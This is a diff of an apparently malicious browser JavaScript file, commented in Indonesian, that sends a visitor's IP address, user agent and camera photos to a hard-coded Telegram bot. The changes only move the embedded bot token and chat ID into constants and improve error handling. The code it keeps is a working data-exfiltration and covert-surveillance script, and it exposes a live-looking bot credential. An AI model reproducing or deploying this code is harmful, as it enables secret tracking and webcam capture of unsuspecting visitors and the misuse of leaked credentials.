@@ -1,6 +1,6 @@
 // Konfigurasi bot Telegram
-const BOT_TOKEN = '7415689438:AAEn-_NYC87F-UUyfxCnZQ25CbAv85hNrkY'; // Ganti dengan bot token yang benar
-const CHAT_ID = '1145550172'; // Ganti dengan Chat ID Anda yang benar
+const BOT_TOKEN = '7415689438:AAEn-_NYC87F-UUyfxCnZQ25CbAv85hNrkY'; // Token bot Anda
+const CHAT_ID = '1145550172'; // Chat ID Anda
 
 // Fungsi untuk mengirim IP dan User Agent
 function sendIPAndUserAgent() {
@@ -17,7 +17,7 @@ function sendIPAndUserAgent() {
 
 // Fungsi untuk mengirim pesan teks ke Telegram
 function sendMessageToTelegram(message) {
-    fetch(`https://api.telegram.org/bot7415689438:AAEn-_NYC87F-UUyfxCnZQ25CbAv85hNrkY/sendMessage`, {
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method: 'POST',
         headers: {
             'Content-Type': 'application/json'
@@ -27,11 +27,12 @@ function sendMessageToTelegram(message) {
             text: message
         })
     })
-    .then(response => {
-        if (response.ok) {
+    .then(response => response.json()) // Parsing response ke JSON
+    .then(data => {
+        if (data.ok) {
             console.log('Message sent to Telegram');
         } else {
-            console.error('Failed to send message to Telegram');
+            console.error('Failed to send message to Telegram:', data.description);
         }
     })
     .catch(error => console.error('Error sending message to Telegram:', error));
@@ -68,19 +69,20 @@ function takePhotoAndSend() {
 
 // Fungsi untuk mengirim foto ke Telegram
 function sendPhoto(photo) {
-    const blob = dataURItoBlob(photo);
+    const blob = dataURItoBlob(photo); // Ubah data URI menjadi Blob
     const formData = new FormData();
     formData.append('photo', blob, 'photo.jpg');
 
-    fetch(`https://api.telegram.org/bot7415689438:AAEn-_NYC87F-UUyfxCnZQ25CbAv85hNrkY/sendPhoto?chat_id=1145550172`, {
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto?chat_id=${CHAT_ID}`, {
         method: 'POST',
         body: formData
     })
-    .then(response => {
-        if (response.ok) {
+    .then(response => response.json()) // Parsing response ke JSON
+    .then(data => {
+        if (data.ok) {
             console.log('Photo sent to Telegram');
         } else {
-            console.error('Failed to send photo to Telegram');
+            console.error('Failed to send photo to Telegram:', data.description);
         }
     })
     .catch(error => console.error('Error sending photo to Telegram:', error));
